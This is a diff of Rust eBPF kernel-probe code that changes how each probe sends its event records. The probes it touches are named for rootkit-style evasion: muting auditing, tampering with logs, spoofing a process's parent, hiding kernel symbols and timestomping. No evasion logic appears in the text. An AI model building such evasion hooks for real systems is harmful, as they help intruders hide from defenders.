@@ -99,7 +99,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: i_ino,
     };
-    EVENTS.output(ctx, &event, 0);
+    let _ = EVENTS.output(&event, 0);
 
     Ok(0)
 }
@@ -126,7 +126,7 @@ fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: 1,
     };
-    EVENTS.output(_ctx, &event, 0);
+    let _ = EVENTS.output(&event, 0);
 
     Ok(0)
 }
@@ -295,7 +295,7 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: scan_len as u64,
     };
-    EVENTS.output(_ctx, &event, 0);
+    let _ = EVENTS.output(&event, 0);
 
     Ok(0)
 }
@@ -461,7 +461,7 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: fake_ppid as u64,
     };
-    EVENTS.output(_ctx, &event, 0);
+    let _ = EVENTS.output(&event, 0);
 
     Ok(0)
 }
@@ -582,7 +582,7 @@ fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
             timestamp_ns: unsafe { bpf_ktime_get_ns() },
             context: args.inode,
         };
-        EVENTS.output(_ctx, &event, 0);
+        let _ = EVENTS.output(&event, 0);
     }
 
     Ok(0)
@@ -717,7 +717,7 @@ fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: args.inode,
     };
-    EVENTS.output(_ctx, &event, 0);
+    let _ = EVENTS.output(&event, 0);
 
     Ok(0)
 }
@@ -804,7 +804,7 @@ fn try_syslog_write(ctx: &ProbeContext) -> Result<u32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: fd,
     };
-    EVENTS.output(ctx, &event, 0);
+    let _ = EVENTS.output(&event, 0);
 
     Ok(0)
 }
